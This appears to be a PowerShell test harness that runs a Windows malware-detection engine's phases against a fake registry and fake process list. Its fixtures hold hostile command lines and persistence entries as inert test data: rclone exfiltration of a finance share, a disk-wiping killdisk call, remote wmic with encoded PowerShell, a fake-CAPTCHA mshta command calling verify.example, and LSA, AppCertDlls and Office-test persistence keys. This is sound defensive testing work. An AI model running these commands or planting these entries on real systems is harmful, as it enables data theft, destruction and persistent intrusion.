# Runtime smoke harness for engine/Phases-4.ps1 — executes the real phase bodies on Linux
# against a synthetic registry + a fixture filesystem. Stubs only the Windows-specific
# surface; every phase body, regex and string interpolation is the shipped code.
$ErrorActionPreference = 'Continue'
$root = $args[0]; $fix = $args[1]
Set-Location $root

# ── synthetic registry ───────────────────────────────────────────────────────
$script:REG = @{}
function RegAdd { param([string]$K, [hashtable]$V = @{}, [string[]]$Sub = @())
    $script:REG[$K.ToLower()] = @{ Path = $K; Values = $V; Sub = $Sub }
    foreach ($s in $Sub) { if (-not $script:REG.ContainsKey("$K\$s".ToLower())) { $script:REG["$K\$s".ToLower()] = @{ Path = "$K\$s"; Values = @{}; Sub = @() } } }
}
function IsReg { param([string]$P) return ($P -match '^(HK(LM|CU|CR|U|CC):|Registry::)') }
function Norm { param([string]$P) if (-not $P) { return $P }; if (IsReg $P) { return $P }; return ($P -replace '\\','/') }
function RegNode { param([string]$P) $k = ($P -replace '^Registry::HKEY_LOCAL_MACHINE','HKLM:' -replace '^Registry::HKEY_CURRENT_USER','HKCU:' -replace '^Registry::HKEY_CLASSES_ROOT','HKCR:').ToLower()
    if ($script:REG.ContainsKey($k)) { return $script:REG[$k] } ; return $null }

function Test-Path { param([Parameter(ValueFromPipeline=$true)]$Path, [string]$LiteralPath)
    $p = if ($LiteralPath) { $LiteralPath } else { "$Path" }
    if (IsReg $p) { return [bool](RegNode $p) }
    Microsoft.PowerShell.Management\Test-Path -LiteralPath (Norm $p) -ErrorAction SilentlyContinue }
function Get-ChildItem { param($Path, $LiteralPath, $Filter, [switch]$Directory, [switch]$File, [switch]$Recurse, $Depth, $ErrorAction)
    $p = if ($LiteralPath) { "$LiteralPath" } else { "$Path" }
    if (IsReg $p) {
        $n = RegNode $p; if (-not $n) { return @() }
        return @($n.Sub | ForEach-Object { [pscustomobject]@{ PSChildName = $_; PSPath = "$($n.Path)\$_" } })
    }
    $sp = @{ LiteralPath = (Norm $p); ErrorAction = 'SilentlyContinue' }
    if ($Filter) { $sp.Filter = $Filter }; if ($Directory) { $sp.Directory = $true }; if ($File) { $sp.File = $true }
    if ($Recurse) { $sp.Recurse = $true }; if ($null -ne $Depth) { $sp.Depth = $Depth }
    Microsoft.PowerShell.Management\Get-ChildItem @sp }
function Get-ItemProperty { param($Path, $LiteralPath, $Name, $ErrorAction)
    $p = if ($LiteralPath) { "$LiteralPath" } else { "$Path" }
    if (IsReg $p) { $n = RegNode $p; if (-not $n) { return $null }
        $o = [pscustomobject]@{ PSPath = $n.Path; PSParentPath = ''; PSChildName = (Split-Path -Leaf $n.Path); PSProvider = 'Registry' }
        foreach ($kv in $n.Values.GetEnumerator()) { $o.PSObject.Properties.Add([System.Management.Automation.PSNoteProperty]::new($kv.Key, $kv.Value)) }
        return $o }
    Microsoft.PowerShell.Management\Get-ItemProperty -LiteralPath (Norm $p) -ErrorAction SilentlyContinue }
function Get-RegVal { param([string]$Path, [string]$Name)
    $n = RegNode $Path; if (-not $n) { return $null }
    if ($n.Values.ContainsKey($Name)) { return $n.Values[$Name] } ; return $null }
function Get-Item { param($Path, $LiteralPath, $ErrorAction)
    $p = if ($LiteralPath) { "$LiteralPath" } else { "$Path" }
    Microsoft.PowerShell.Management\Get-Item -LiteralPath (Norm $p) -ErrorAction SilentlyContinue }
function Get-Service { param($Name, $ErrorAction) $null }

# ── engine helper stubs ──────────────────────────────────────────────────────
$global:FINDINGS = New-Object System.Collections.ArrayList
$global:PHASES_RUN = New-Object System.Collections.ArrayList
$global:BANNER_LINES = New-Object System.Collections.ArrayList
function Write-RecoveredError { param($E) Write-Host ("  !! RECOVERED ERROR: " + $E.ToString() + " @ " + $E.InvocationInfo.ScriptLineNumber) -ForegroundColor Magenta; $global:RECOVERED++ }
function Show-PhaseHeader { param([string]$Phase,[string]$Desc,[string]$Category="") [void]$global:PHASES_RUN.Add($Phase); Write-Host ("`n== {0} : {1}" -f $Phase,$Desc) -ForegroundColor DarkCyan }
function Out-Typewriter { param([string]$Text,[string]$Level="INFO",[int]$Speed=16) [void]$global:BANNER_LINES.Add("[$Level] $Text") }
function Out-Decrypt { param([string]$Text,[string]$Prefix="",[int]$Delay=8) }
function Out-ThreatBanner { param([string]$Category,[string]$Detail) [void]$global:BANNER_LINES.Add("THREAT: $Category | $Detail") }
function Invoke-QuantumBar { param($TaskName,$Steps=15,$MsEach=90) }
function Show-SectionBanner { param($T) }
function Write-Log { param($L) }
function ConvertTo-PsLiteral { param([string]$Value) return ("$Value" -replace "'","''") }
function Add-Finding {
    param([string]$ID,[string]$Phase,[string]$ThreatType,[string]$Severity,[string]$Description,
          [string]$Target,[string]$FixAction,[string]$FixParam="",[string]$Group="")
    foreach ($x in $global:FINDINGS) { if ($x.ID -eq $ID) { return } }
    [void]$global:FINDINGS.Add([pscustomobject]@{ ID=$ID;Phase=$Phase;ThreatType=$ThreatType;Severity=$Severity
        Description=$Description;Target=$Target;FixAction=$FixAction;FixParam=$FixParam;Group=$Group }) }
function Test-InScope { param($ItemTime) $true }
function Get-KillParam { param($Id) "$Id|test|0" }
function Get-Perm { param([string]$Name) @() }
function Get-WinEventSafe { param([hashtable]$Filter,[int]$MaxEvents=0) @() }
function Get-FileHashSafe { param([string]$Path) $null }
function Get-AuthSig { param([string]$Path) $null }
$global:SIG_STATUS = @{}     # fixture-controlled signature verdicts
function Get-SignatureVerdict { param([string]$FilePath)
    foreach ($k in $global:SIG_STATUS.Keys) { if ($FilePath -like $k) { return $global:SIG_STATUS[$k] } }
    return @{ Status='NotSigned'; Signer=''; Trusted=$false; IsMs=$false; Exists=$true } }
$global:PROCS = @()
function Get-ProcSnapshot { return ,$global:PROCS }
function Get-ScanFiles { param([string[]]$Path,[string]$Filter='*',[switch]$TimeScoped,[int]$MaxFiles=20000,[int]$DeadlineSecs=20,[string[]]$PruneDirs=@())
    $acc = New-Object System.Collections.ArrayList
    foreach ($p in @($Path)) {
        $pn = Norm $p
        if (-not $pn -or -not (Microsoft.PowerShell.Management\Test-Path -LiteralPath $pn -ErrorAction SilentlyContinue)) { continue }
        foreach ($f in @(Microsoft.PowerShell.Management\Get-ChildItem -LiteralPath $pn -Filter $Filter -File -Recurse -ErrorAction SilentlyContinue)) { [void]$acc.Add($f) }
    }
    return ,$acc.ToArray() }
function Test-ContentRules { param([string]$FilePath,$Rules,[int]$MaxBytes=5242880)
    if (-not $Rules -or @($Rules).Count -eq 0) { return @{ Hit=$false } }
    $FilePath = Norm $FilePath
    try { $fi = Microsoft.PowerShell.Management\Get-Item -LiteralPath $FilePath -ErrorAction Stop
          if ($fi.Length -eq 0 -or $fi.Length -gt $MaxBytes) { return @{ Hit=$false } }
          $text = [System.IO.File]::ReadAllText($FilePath) } catch { return @{ Hit=$false } }
    $rank = @{ "CRITICAL"=3; "HIGH"=2; "POSSIBLE"=1 }; $best = $null
    foreach ($r in $Rules) { try { if ($text -match $r.Pattern) {
        if ($null -eq $best -or [int]$rank["$($r.Severity)"] -gt [int]$rank["$($best.Severity)"]) { $best = @{ Hit=$true; Name=$r.Name; Severity=$r.Severity } } } } catch {} }
    if ($best) { return $best } ; return @{ Hit=$false } }

# ── globals the module reads ────────────────────────────────────────────────
$SEV_CRITICAL='CRITICAL'; $SEV_HIGH='HIGH'; $SEV_POSSIBLE='POSSIBLE'; $SEV_INFO='INFO'
$global:STEALTH_MODE=$false; $global:PARANOID_MODE=$false; $global:NONINTERACTIVE=$true
$global:TIME_LIMIT=[datetime]::MinValue; $global:TrojanHits=0; $global:SpywareHits=0
$global:SIG_AUDIT_DEADLINE_S=25; $global:SIG_AUDIT_MAX_FILES=150; $global:RECOVERED=0
$global:WINDIR = Join-Path $fix 'Windows'
$PhasePlan = @{ Min=1; Max=133; Universal=$true; Advanced=$true; Integrity=$true; Extended=$true }

# ── load the REAL signature wiring out of the loader ────────────────────────
# ── fixture environment + synthetic registry (was fixtures.ps1) ─────────────
# Point the module's environment at the fixture tree.
$env:APPDATA        = Join-Path $fix 'AppData/Roaming'
$env:LOCALAPPDATA   = Join-Path $fix 'AppData/Local'
$env:TEMP           = Join-Path $fix 'AppData/Local/Temp'
$env:USERPROFILE    = $fix
$env:PUBLIC         = Join-Path $fix 'Public'
$env:PROGRAMDATA    = Join-Path $fix 'ProgramData'
$env:PROGRAMFILES   = Join-Path $fix 'Program Files'
$env:SystemDrive    = $fix
$env:WINDIR         = Join-Path $fix 'Windows'
$env:ProgramFiles   = Join-Path $fix 'Program Files'

# Signature verdicts the fixtures rely on.
$global:SIG_STATUS = @{
  '*EvilApp*RealApp.exe'   = @{ Status='Valid';        Signer='CN=Real Vendor'; Trusted=$true;  IsMs=$false; Exists=$true }
  '*OneDrive*OneDrive.exe' = @{ Status='Valid';        Signer='CN=Microsoft';   Trusted=$true;  IsMs=$true;  Exists=$true }
  '*notepad2.exe'          = @{ Status='HashMismatch'; Signer='CN=Notepad2';    Trusted=$false; IsMs=$false; Exists=$true }
}
# Live processes.
$global:PROCS = @(
  [pscustomobject]@{ Name='chrome.exe';  ProcessId=1001; ExecutablePath='C:\chrome.exe'
                     CommandLine='"C:\chrome.exe" --remote-debugging-port=9222 --user-data-dir=C:\Temp\p' }
  [pscustomobject]@{ Name='rclone.exe';  ProcessId=1002; ExecutablePath='C:\Users\Public\rclone.exe'
                     CommandLine='rclone.exe copy \\fs01\finance loot:dump --transfers 32' }
  [pscustomobject]@{ Name='killdisk.exe';ProcessId=1003; ExecutablePath='C:\Users\Public\killdisk.exe'
                     CommandLine='killdisk.exe \\.\PhysicalDrive0' }
  [pscustomobject]@{ Name='cmd.exe';     ProcessId=1004; ExecutablePath='C:\Windows\System32\cmd.exe'
                     CommandLine='cmd /c wmic /node:10.0.0.5 process call create "powershell -enc AAAA"' }
  [pscustomobject]@{ Name='anydesk.exe'; ProcessId=1005; ExecutablePath=(Join-Path $fix 'AppData\Local\Temp\anydesk.exe')
                     CommandLine='anydesk.exe --service' }
)
# Synthetic registry — malicious entries plus stock controls.
RegAdd 'HKLM:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist' @{ '1' = 'aaaabbbbccccddddeeeeffffgggghhhh;https://evil.example/crx' }
RegAdd 'HKLM:\SOFTWARE\Policies\Google\Chrome' @{ 'SafeBrowsingEnabled' = 0; 'HomepageLocation' = 'http://hijack.example' }
RegAdd 'HKCU:\SOFTWARE\Google\Chrome\NativeMessagingHosts' @{} @('com.evil.helper','com.1password.browserhelper')
RegAdd 'HKCU:\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.evil.helper' @{ '(default)' = 'C:\Users\Public\host.json' }
RegAdd 'HKCU:\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.1password.browserhelper' @{ '(default)' = 'C:\Program Files\1Password\host.json' }
RegAdd 'HKLM:\SOFTWARE\Microsoft\Office test\Special\Perf' @{ '(default)' = 'C:\Users\Public\evil.dll' }
RegAdd 'HKCU:\SOFTWARE\Microsoft\Office\Excel\Addins' @{} @('Evil.Addin')
RegAdd 'HKCU:\SOFTWARE\Microsoft\Office\Excel\Addins\Evil.Addin' @{ 'LoadBehavior' = 3; 'FriendlyName' = 'Evil'; 'Manifest' = 'C:\Users\Public\AppData\evil.vsto' }
RegAdd 'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings' @{} @('S-1-5-21-1')
RegAdd 'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-1' @{
    '\Device\HarddiskVolume3\Users\jdoe\AppData\Local\Temp\dropper.exe' = 1
    '\Device\HarddiskVolume3\Program Files\Notepad++\notepad++.exe'     = 1 }
RegAdd 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' @{
    'a' = 'powershell -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA\1'
    'b' = 'mshta https://verify.example/c.hta # ✅ I am not a robot\1'
    'c' = 'notepad.exe\1'
    'MRUList' = 'abc' }
RegAdd 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls' @{ 'evil' = 'C:\Users\Public\ac.dll' }
RegAdd 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' @{
    'Authentication Packages' = @('msv1_0','evilpkg'); 'Notification Packages' = @('scecli','rassfm')
    'Security Packages'       = @('kerberos','msv1_0','schannel','wdigest','tspkg','pku2u','negoexts','cloudap') }
RegAdd 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager' @{ 'BootExecute' = @('autocheck autochk *') }
RegAdd 'HKLM:\SOFTWARE\Microsoft\Command Processor' @{ 'AutoRun' = 'C:\Users\Public\boot.cmd' }
RegAdd 'HKCU:\SOFTWARE\Classes\*\shellex\ContextMenuHandlers' @{} @('EvilMenu')
RegAdd 'HKCU:\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\EvilMenu' @{ '(default)' = '{11111111-2222-3333-4444-555555555555}' }
RegAdd 'HKCR:\CLSID\{11111111-2222-3333-4444-555555555555}\InprocServer32' @{ '(default)' = 'C:\Users\jdoe\AppData\Local\Temp\shell.dll' }

$SIG = Get-Content (Join-Path $root 'data/detection_signatures.json') -Raw | ConvertFrom-Json
function Get-Sig([string]$Name) { if ($SIG -and $null -ne $SIG.$Name) { @($SIG.$Name) } else { @() } }
function Join-AllowRegex([string]$Name) { $a = @(Get-Sig $Name); if ($a.Count) { ($a -join '|') } else { '(?!)' } }
$lt=$null; $le=$null
$lAst=[System.Management.Automation.Language.Parser]::ParseFile((Resolve-Path 'Scythe-V23.ps1').Path,[ref]$lt,[ref]$le)
$loaded=0
foreach ($a in $lAst.FindAll({param($n) $n -is [System.Management.Automation.Language.AssignmentStatementAst]},$true)) {
    $txt = $a.Extent.Text
    if ($txt -notmatch "Get-Sig\s+'|Join-AllowRegex\s+'") { continue }
    try { . ([scriptblock]::Create($txt)); $loaded++ } catch { Write-Host "  sig-load failed: $($txt.Substring(0,[Math]::Min(60,$txt.Length)))" -ForegroundColor Yellow }
}
Write-Host "loaded $loaded signature variables from the loader" -ForegroundColor DarkGray
. (Join-Path $root 'engine/Phases-4.ps1')

Write-Host ("`n─── RESULT ───") -ForegroundColor Cyan
Write-Host ("phases executed : {0}  [{1}]" -f $global:PHASES_RUN.Count, (($global:PHASES_RUN -replace 'PHASE ','') -join ','))
Write-Host ("recovered errors: {0}" -f $global:RECOVERED) -ForegroundColor $(if($global:RECOVERED){'Red'}else{'Green'})
Write-Host ("findings        : {0}" -f $global:FINDINGS.Count)
$global:FINDINGS | Sort-Object Phase | ForEach-Object {
    Write-Host ("  {0,-10} {1,-9} {2,-13} {3}" -f $_.Phase, $_.Severity, $_.FixAction, ($_.Target -replace [regex]::Escape($fix),'~')) }
if ($global:RECOVERED -gt 0) { exit 1 }
